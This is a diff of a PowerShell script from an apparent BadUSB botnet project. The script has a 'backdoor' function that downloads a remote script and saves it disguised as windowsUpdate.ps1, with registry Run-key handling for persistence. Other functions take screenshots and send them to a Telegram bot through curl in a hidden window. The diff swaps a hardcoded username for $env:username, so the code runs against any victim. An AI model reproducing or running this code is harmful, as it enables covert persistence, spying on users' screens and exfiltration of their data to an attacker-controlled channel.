@@ -31,8 +31,8 @@ $githubScript = 'https://raw.githubusercontent.com/alexfrancow/badusb_botnet/mas
 ###############
 
 function backdoor {
-	reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
-
+        reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
+        
         Write-Host "Downloading backdoor.."
         Invoke-WebRequest -Uri $githubScript -OutFile C:\Users\$env:username\Documents\windowsUpdate.ps1
 
@@ -63,7 +63,7 @@ function screenshot {
            $bmp.Dispose()
         }
         $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1920, 1080)
-        screenshot $bounds "C:\Users\afranco\Documents\screenshot.jpg"
+        screenshot $bounds "C:\Users\$env:username\Documents\screenshot.jpg"
 }
 
 function cleanAll {
@@ -97,7 +97,7 @@ function installCurl {
 
 function sendPhoto {
     $uri = "https://api.telegram.org/bot" + $BotToken + "/sendPhoto"
-    $photo = "C:\Users\afranco\Documents\screenshot.jpg"
+    $photo = "C:\Users\$env:username\Documents\screenshot.jpg"
     $curl = installCurl
     $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F photo=@' + $photo  + ' -k '
     Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
